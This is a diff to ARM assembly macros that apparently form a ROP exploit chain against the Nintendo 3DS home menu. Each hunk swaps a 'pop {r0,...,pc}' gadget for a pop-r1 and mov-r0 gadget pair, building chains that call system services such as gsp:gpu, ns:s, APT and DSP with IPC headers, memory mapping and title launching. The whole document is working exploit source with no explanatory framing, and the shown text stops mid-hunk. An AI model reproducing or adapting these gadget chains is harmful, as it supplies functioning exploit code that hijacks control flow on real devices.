@@ -4,8 +4,12 @@
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word MENU_NOP ; pop {pc}
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
-		.word MENU_NOP ; pop {pc}
+	.word ROP_MENU_POP_R1PC
+		.word MENU_NOP
+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word 0xDEADBABE
+		.word 0xDEADBABE
+		.word 0xDEADBABE
 .endif
 	.word ROP_MENU_POP_R4LR_BX_R0 ; pop {r4, lr} ; bx r0
 		.word 0xDEADBABE ; r4 (garbage)
@@ -18,8 +22,12 @@
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word MENU_OBJECT_LOC - 4 ; r0 (out ptr)
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
-		.word MENU_OBJECT_LOC - 4 ; r0 (out ptr)
+	.word ROP_MENU_POP_R1PC
+		.word MENU_OBJECT_LOC - 4
+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word 0xDEADBABE
+		.word 0xDEADBABE
+		.word 0xDEADBABE
 .endif
 	.word ROP_MENU_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
 		.word tidlow ; r2 (tid low) 
@@ -69,8 +77,12 @@
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word dst ; r0 (out ptr)
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
+	.word ROP_MENU_POP_R1PC
 		.word dst ; r0 (out ptr)
+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word 0xDEADBABE
+		.word 0xDEADBABE
+		.word 0xDEADBABE
 .endif
 	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
 		.word src ; r1 (src)
@@ -93,8 +105,12 @@
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word handle_outptr ; r0 (out ptr)
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
+	.word ROP_MENU_POP_R1PC
 		.word handle_outptr ; r0 (out ptr)
+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word 0xDEADBABE
+		.word 0xDEADBABE
+		.word 0xDEADBABE
 .endif
 	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
 		.word resettype ; r1 (src)
@@ -114,8 +130,12 @@
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word out ; r0 (out ptr)
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
-		.word out ; r0 (out ptr)
+	.word ROP_MENU_POP_R1PC
+		.word out
+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word 0xDEADBABE
+		.word 0xDEADBABE
+		.word 0xDEADBABE
 .endif
 	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
 		.word handles ; r1 (src)
@@ -171,8 +191,12 @@
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word DUMMY_PTR ; r0 (app_id out ptr)
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
-		.word DUMMY_PTR ; r0 (app_id out ptr)
+	.word ROP_MENU_POP_R1PC
+		.word DUMMY_PTR
+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word 0xDEADBABE
+		.word 0xDEADBABE
+		.word 0xDEADBABE
 .endif
 	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
 		.word app_id ; r1 (app_id)
@@ -202,8 +226,12 @@
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word DUMMY_PTR ; r0 (app_id out ptr)
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
-		.word DUMMY_PTR ; r0 (app_id out ptr)
+	.word ROP_MENU_POP_R1PC
+		.word DUMMY_PTR
+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word 0xDEADBABE
+		.word 0xDEADBABE
+		.word 0xDEADBABE
 .endif
 	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
 		.word app_id ; r1 (app_id)
@@ -233,8 +261,12 @@
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word app_id ; r0 (app_id out ptr)
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
-		.word app_id ; r0 (app_id out ptr)
+	.word ROP_MENU_POP_R1PC
+		.word app_id
+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word 0xDEADBABE
+		.word 0xDEADBABE
+		.word 0xDEADBABE
 .endif
 	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
 		.word out_ptr ; r1 (app_id)
@@ -251,8 +283,12 @@
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word handle_ptr ; r0
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
-		.word handle_ptr ; r0
+	.word ROP_MENU_POP_R1PC
+		.word handle_ptr
+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word 0xDEADBABE
+		.word 0xDEADBABE
+		.word 0xDEADBABE
 .endif
 	.word ROP_MENU_LDR_R0R0_POP_R4PC ; ldr r0, [r0] ; pop {r4, pc}
 		.word MENU_LOADEDROP_BUFADR + @@handle_loc ; r4 (destination address)
@@ -263,8 +299,12 @@
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word 0x101 ; r0 (source app_id)
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
-		.word 0x101 ; r0 (source app_id)
+	.word ROP_MENU_POP_R1PC
+		.word 0x101
+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word 0xDEADBABE
+		.word 0xDEADBABE
+		.word 0xDEADBABE
 .endif
 	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
 		.word dst_id ; r1 (destination app_id)
@@ -287,8 +327,12 @@
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word MENU_OBJECT_LOC + @@tid_struct ; r0
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
-		.word MENU_OBJECT_LOC + @@tid_struct ; r0
+	.word ROP_MENU_POP_R1PC
+		.word MENU_OBJECT_LOC + @@tid_struct
+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word 0xDEADBABE
+		.word 0xDEADBABE
+		.word 0xDEADBABE
 .endif
 	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
 		.word flag ; r1
@@ -307,8 +351,12 @@
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word buf0 ; r0 (buf0 ptr)
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
-		.word buf0 ; r0 (buf0 ptr)
+	.word ROP_MENU_POP_R1PC
+		.word buf0
+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word 0xDEADBABE
+		.word 0xDEADBABE
+		.word 0xDEADBABE
 .endif
 	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
 		.word buf0_size ; r1 (buf0 size)
@@ -328,8 +376,12 @@
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word buf0 ; r0 (buf0 ptr)
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
-		.word buf0 ; r0 (buf0 ptr)
+	.word ROP_MENU_POP_R1PC
+		.word buf0
+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word 0xDEADBABE
+		.word 0xDEADBABE
+		.word 0xDEADBABE
 .endif
 	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
 		.word buf0_size ; r1 (buf0 size)
@@ -348,8 +400,12 @@
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word appid ; r0
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
-		.word appid ; r0
+	.word ROP_MENU_POP_R1PC
+		.word appid
+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word 0xDEADBABE
+		.word 0xDEADBABE
+		.word 0xDEADBABE
 .endif
 	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
 		.word a ; r1
@@ -362,8 +418,12 @@
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word appid ; r0
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
-		.word appid ; r0
+	.word ROP_MENU_POP_R1PC
+		.word appid
+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word 0xDEADBABE
+		.word 0xDEADBABE
+		.word 0xDEADBABE
 .endif
 	.word ROP_MENU_APT_REPLYSLEEPNOTIFICATIONCOMPLETE
 .endmacro
@@ -377,8 +437,12 @@
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word appid ; r0
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
-		.word appid ; r0
+	.word ROP_MENU_POP_R1PC
+		.word appid
+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word 0xDEADBABE
+		.word 0xDEADBABE
+		.word 0xDEADBABE
 .endif
 	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
 		.word out ; r1
@@ -415,8 +479,12 @@
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word val ; r0
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
-		.word val ; r0
+	.word ROP_MENU_POP_R1PC
+		.word val
+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word 0xDEADBABE
+		.word 0xDEADBABE
+		.word 0xDEADBABE
 .endif
 	.word ROP_MENU_APT_APPLETUTILITYCMD7
 .endmacro
@@ -445,8 +513,12 @@
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word 0x00000000 ; r0 (buf0 ptr)
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
-		.word 0x00000000 ; r0 (buf0 ptr)
+	.word ROP_MENU_POP_R1PC
+		.word 0x00000000
+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word 0xDEADBABE
+		.word 0xDEADBABE
+		.word 0xDEADBABE
 .endif
 	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
 		.word 0x00000000 ; r1 (buf0 size)
@@ -513,8 +585,12 @@
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word cmpval_adr ; r0 (ptr)
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
-		.word cmpval_adr ; r0 (ptr)
+	.word ROP_MENU_POP_R1PC
+		.word cmpval_adr
+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word 0xDEADBABE
+		.word 0xDEADBABE
+		.word 0xDEADBABE
 .endif
 	.word ROP_MENU_LDR_R0R0_POP_R4PC ; pop {r0, pc}
 		.word 0xDEADBABE ; r4 (garbage)
@@ -527,8 +603,12 @@
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word MENU_GSPGPU_HANDLE ; r0 (gsp handle ptr)
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
-		.word MENU_GSPGPU_HANDLE ; r0 (gsp handle ptr)
+	.word ROP_MENU_POP_R1PC
+		.word MENU_GSPGPU_HANDLE
+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word 0xDEADBABE
+		.word 0xDEADBABE
+		.word 0xDEADBABE
 .endif
 	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
 		.word 0xFFFF8001 ; r1 (process handle)
@@ -552,8 +632,12 @@
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word MENU_GSPGPU_HANDLE ; r0 (gsp:gpu handle)
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
-		.word MENU_GSPGPU_HANDLE ; r0 (gsp:gpu handle)
+	.word ROP_MENU_POP_R1PC
+		.word MENU_GSPGPU_HANDLE
+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word 0x00150002
+		.word 0x00000000
+		.word 0xFFFF8001
 .endif
 	.word ROP_MENU_POP_R4PC ; pop {r4, pc}
 		.word DUMMY_PTR ; r4 (dummy but address needs to be valid/readable)
@@ -567,8 +651,12 @@
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word MENU_DSP_HANDLE_STRUCT + 0x10 ; r0 (dsp handle ptr)
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
-		.word MENU_DSP_HANDLE_STRUCT + 0x10 ; r0 (dsp handle ptr)
+	.word ROP_MENU_POP_R1PC
+		.word MENU_DSP_HANDLE_STRUCT + 0x10
+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word 0xDEADBABE
+		.word 0xDEADBABE
+		.word 0xDEADBABE
 .endif
 	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
 		.word 0x00000000 ; r1 (interrupt handle)
@@ -587,8 +675,12 @@
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word MENU_DSP_HANDLE_STRUCT + 0x10 ; r0 (dsp handle ptr)
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
-		.word MENU_DSP_HANDLE_STRUCT + 0x10 ; r0 (dsp handle ptr)
+	.word ROP_MENU_POP_R1PC
+		.word MENU_DSP_HANDLE_STRUCT + 0x10
+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word 0xDEADBABE
+		.word 0xDEADBABE
+		.word 0xDEADBABE
 .endif
 	.word ROP_MENU_DSP_UNLOADCOMPONENT
 .endmacro
@@ -599,8 +691,12 @@
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word MENU_GSPGPU_HANDLE ; r0 (gsp handle ptr)
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
-		.word MENU_GSPGPU_HANDLE ; r0 (gsp handle ptr)
+	.word ROP_MENU_POP_R1PC
+		.word MENU_GSPGPU_HANDLE
+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word 0xDEADBABE
+		.word 0xDEADBABE
+		.word 0xDEADBABE
 .endif
 	.word MENU_GSPGPU_RELEASERIGHT
 .endmacro
@@ -611,8 +707,12 @@
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word MENU_GSPGPU_HANDLE ; r0 (handle ptr)
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
-		.word MENU_GSPGPU_HANDLE ; r0 (handle ptr)
+	.word ROP_MENU_POP_R1PC
+		.word MENU_GSPGPU_HANDLE
+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word 0xDEADBABE
+		.word 0xDEADBABE
+		.word 0xDEADBABE
 .endif
 	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
 		.word 0xFFFF8001 ; r1 (process handle)
@@ -631,8 +731,12 @@
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word MENU_GSPGPU_HANDLE ; r0 (handle ptr)
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
-		.word MENU_GSPGPU_HANDLE ; r0 (handle ptr)
+	.word ROP_MENU_POP_R1PC
+		.word MENU_GSPGPU_HANDLE
+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word 0xDEADBABE
+		.word 0xDEADBABE
+		.word 0xDEADBABE
 .endif
 	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
 		.word reg ; r1 (reg base)
@@ -651,8 +755,12 @@
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word outaddr ; r0
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
-		.word outaddr ; r0
+	.word ROP_MENU_POP_R1PC
+		.word outaddr
+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word 0xDEADBABE
+		.word 0xDEADBABE
+		.word 0xDEADBABE
 .endif
 	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
 		.word addr0 ; r1
@@ -673,8 +781,12 @@
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word ptr - 4 ; r0
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
-		.word ptr - 4 ; r0
+	.word ROP_MENU_POP_R1PC
+		.word ptr - 4
+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word 0xDEADBABE
+		.word 0xDEADBABE
+		.word 0xDEADBABE
 .endif
 	.word ROP_MENU_LDR_R1R0x4_ADD_R0R0R1_POP_R3R4R5PC
 		.word 0xDEADBABE ; r3 (garbage)
@@ -684,8 +796,12 @@
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word DUMMY_PTR ; r0
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
-		.word DUMMY_PTR ; r0
+	.word ROP_MENU_POP_R1PC
+		.word DUMMY_PTR
+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word 0xDEADBABE
+		.word 0xDEADBABE
+		.word 0xDEADBABE
 .endif
 	.word ROP_MENU_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
 		.word 0x00000000 ; r2
@@ -704,9 +820,13 @@
 		@@reg_data:
 			.word data ; r0 (just used to skip over data)
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
+	.word ROP_MENU_POP_R1PC
 		@@reg_data:
-			.word data ; r0 (just used to skip over data)
+			.word data
+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word 0xDEADBABE
+		.word 0xDEADBABE
+		.word 0xDEADBABE
 .endif
 	writehwregs reg, (MENU_OBJECT_LOC + @@reg_data - object), 0x4
 .endmacro
@@ -726,8 +846,12 @@
 	.word ROP_MENU_POP_R0PC
 		.word id
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
+	.word ROP_MENU_POP_R1PC
 		.word id
+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word 0xDEADBABE
+		.word 0xDEADBABE
+		.word 0xDEADBABE
 .endif
 	.word ROP_MENU_SRV_SUBSCRIBE
 .endmacro
@@ -738,8 +862,12 @@
 	.word ROP_MENU_POP_R0PC
 		.word out_ptr
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
+	.word ROP_MENU_POP_R1PC
 		.word out_ptr
+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word 0xDEADBABE
+		.word 0xDEADBABE
+		.word 0xDEADBABE
 .endif
 	.word ROP_MENU_POP_R1PC
 		.word str_ptr
@@ -762,8 +890,12 @@
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word MENU_SRV_HANDLE ; r0 (gsp:gpu handle)
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
-		.word MENU_SRV_HANDLE ; r0 (gsp:gpu handle)
+	.word ROP_MENU_POP_R1PC
+		.word MENU_SRV_HANDLE
+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word DUMMY_PTR
+		.word 0xDEADBABE
+		.word 0xDEADBABE
 .endif
 	.word ROP_MENU_LDR_R0R0_SVC_x32_AND_R1R0x80000000_CMP_R1x0_LDRGE_R0R4x4_POP_R4PC ; ldr r0, [r0] ; svc 0x00000032 ; and r1, r0, #-2147483648 ; cmp r1, #0 ; ldrge r0, [r4, #4] ; pop {r4, pc}
 		.word 0xDEADBABE ; r4 (garbage)
@@ -780,8 +912,12 @@
 	.word ROP_MENU_POP_R0PC
 		.word MENU_LOADEDROP_BUFADR + @@function_call + offset - 4
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
+	.word ROP_MENU_POP_R1PC
 		.word MENU_LOADEDROP_BUFADR + @@function_call + offset - 4
+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word ROP_MENU_LDR_R0R0_SVC_x32_AND_R1R0x80000000_CMP_R1x0_LDRGE_R0R4x4_POP_R4PC
+		.word 0xDEADBABE
+		.word 0xDEADBABE
 .endif
 	.word ROP_MENU_STRNE_R4R0x4_POP_R4PC
 		.word 0xDEADBABE ; r4 (garbage)
@@ -795,8 +931,12 @@
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word MENU_PTMSYSM_HANDLE ; r0 (gsp:gpu handle)
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
-		.word MENU_PTMSYSM_HANDLE ; r0 (gsp:gpu handle)
+	.word ROP_MENU_POP_R1PC
+		.word MENU_PTMSYSM_HANDLE
+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word 0x08180040
+		.word 0xDEADBABE
+		.word 0xDEADBABE
 .endif
 	.word ROP_MENU_POP_R4PC ; pop {r4, pc}
 		.word DUMMY_PTR ; r4 (dummy but address needs to be valid/readable)
@@ -815,8 +955,12 @@
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word MENU_NSS_HANDLE ; r0
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
-		.word MENU_NSS_HANDLE ; r0
+	.word ROP_MENU_POP_R1PC
+		.word MENU_NSS_HANDLE
+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word DUMMY_PTR
+		.word 0xDEADBABE
+		.word 0xDEADBABE
 .endif
 	.word ROP_MENU_LDR_R0R0_SVC_x32_AND_R1R0x80000000_CMP_R1x0_LDRGE_R0R4x4_POP_R4PC ; ldr r0, [r0] ; svc 0x00000032 ; and r1, r0, #-2147483648 ; cmp r1, #0 ; ldrge r0, [r4, #4] ; pop {r4, pc}
 		.word 0xDEADBABE ; r4 (garbage)
@@ -834,8 +978,12 @@
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word MENU_PTMSYSM_HANDLE ; r0 (gsp:gpu handle)
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
-		.word MENU_PTMSYSM_HANDLE ; r0 (gsp:gpu handle)
+	.word ROP_MENU_POP_R1PC
+		.word MENU_PTMSYSM_HANDLE
+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word 0x08180040
+		.word val
+		.word 0xDEADBABE
 .endif
 	.word ROP_MENU_POP_R4PC ; pop {r4, pc}
 		.word DUMMY_PTR ; r4 (dummy but address needs to be valid/readable)
@@ -859,8 +1007,12 @@
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word MENU_GSPGPU_HANDLE ; r0 (gsp:gpu handle)
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
-		.word MENU_GSPGPU_HANDLE ; r0 (gsp:gpu handle)
+	.word ROP_MENU_POP_R1PC
+		.word MENU_GSPGPU_HANDLE
+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word 0x00090082
+		.word addr
+		.word size
 .endif
 	.word ROP_MENU_POP_R4PC ; pop {r4, pc}
 		.word DUMMY_PTR ; r4 (dummy but address needs to be valid/readable)
@@ -879,8 +1031,12 @@
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word MENU_APT_HANDLE
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
+	.word ROP_MENU_POP_R1PC
 		.word MENU_APT_HANDLE
+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word 0x004F0080
+		.word 0x00000001
+		.word value
 .endif
 	.word ROP_MENU_POP_R4PC ; pop {r4, pc}
 		.word DUMMY_PTR ; r4 (dummy but address needs to be valid/readable)
@@ -901,8 +1057,12 @@
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word MENU_NSS_HANDLE ; r0 (ns:s handle)
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
-		.word MENU_NSS_HANDLE ; r0 (ns:s handle)
+	.word ROP_MENU_POP_R1PC
+		.word MENU_NSS_HANDLE
+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word 0xDEADBABE
+		.word 0x000200C0
+		.word tidlow
 .endif
 	.word ROP_MENU_POP_R4PC ; pop {r4, pc}
 		.word DUMMY_PTR ; r4 (dummy but address needs to be valid/readable)
@@ -924,8 +1084,12 @@
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word MENU_NSS_HANDLE ; r0 (ns:s handle)
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
-		.word MENU_NSS_HANDLE ; r0 (ns:s handle)
+	.word ROP_MENU_POP_R1PC
+		.word MENU_NSS_HANDLE
+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word 0x00110100
+		.word tid_low
+		.word tid_high
 .endif
 	.word ROP_MENU_POP_R4PC ; pop {r4, pc}
 		.word DUMMY_PTR ; r4 (dummy but address needs to be valid/readable)
@@ -948,8 +1112,12 @@
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word MENU_NSS_HANDLE ; r0 (ns:s handle)
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
-		.word MENU_NSS_HANDLE ; r0 (ns:s handle)
+	.word ROP_MENU_POP_R1PC
+		.word MENU_NSS_HANDLE
+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word 0xDEADBABE
+		.word 0x00150140
+		.word tid_low
 .endif
 	.word ROP_MENU_POP_R4PC ; pop {r4, pc}
 		.word DUMMY_PTR ; r4 (dummy but address needs to be valid/readable)
@@ -974,8 +1142,12 @@
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word MENU_NSS_HANDLE ; r0 (ns:s handle)
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
-		.word MENU_NSS_HANDLE ; r0 (ns:s handle)
+	.word ROP_MENU_POP_R1PC
+		.word MENU_NSS_HANDLE
+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word 0x00110100
+		.word 0xDEADBABE
+		.word 0xDEADBABE
 .endif
 	.word ROP_MENU_POP_R4PC ; pop {r4, pc}
 		.word DUMMY_PTR ; r4 (dummy but address needs to be valid/readable)
@@ -993,8 +1165,12 @@
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word MENU_APT_HANDLE ; r0 (apt handle)
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
-		.word MENU_APT_HANDLE ; r0 (apt handle)
+	.word ROP_MENU_POP_R1PC
+		.word MENU_APT_HANDLE
+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word 0x00230040
+		.word 0x00000000
+		.word 0xDEADBABE
 .endif
 	.word ROP_MENU_POP_R4PC ; pop {r4, pc}
 		.word DUMMY_PTR ; r4 (dummy but address needs to be valid/readable)
@@ -1015,8 +1191,12 @@
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word MENU_APT_HANDLE ; r0 (apt handle)
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
-		.word MENU_APT_HANDLE ; r0 (apt handle)
+	.word ROP_MENU_POP_R1PC
+		.word MENU_APT_HANDLE
+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word 0x00240044
+		.word 0x00000000
+		.word 0x00000000
 .endif
 	.word ROP_MENU_POP_R4PC ; pop {r4, pc}
 		.word DUMMY_PTR ; r4 (dummy but address needs to be valid/readable)
@@ -1033,8 +1213,12 @@
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word MENU_APT_HANDLE ; r0 (apt handle)
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
-		.word MENU_APT_HANDLE ; r0 (apt handle)
+	.word ROP_MENU_POP_R1PC
+		.word MENU_APT_HANDLE
+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word 0x004E0000
+		.word 0xDEADBABE
+		.word 0xDEADBABE
 .endif
 	.word ROP_MENU_POP_R4PC ; pop {r4, pc}
 		.word DUMMY_PTR ; r4 (dummy but address needs to be valid/readable)
@@ -1052,8 +1236,12 @@
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word MENU_APT_HANDLE ; r0 (apt handle)
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
-		.word MENU_APT_HANDLE ; r0 (apt handle)
+	.word ROP_MENU_POP_R1PC
+		.word MENU_APT_HANDLE
+	.word ROP_MENU_MOV_R0R1_POP_R4R5R6PC
+		.word 0x00060040
+		.word appid
+		.word 0xDEADBABE
 .endif
 	.word ROP_MENU_POP_R4PC ; pop {r4, pc}
 		.word DUMMY_PTR ; r4 (dummy but address needs to be valid/readable)
@@ -1071,8 +1259,12 @@
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word MENU_APT_HANDLE ; r0 (apt handle)
 .else
-	.word VIRTUAL_ROP_POP_R0PC ; pop {r0, r8, r11, pc}
-		.word MENU_APT_HANDLE ; r0 (apt handle)
+	.word ROP_MENU_POP_R1PC
+		.word MENU_APT_HANDLE
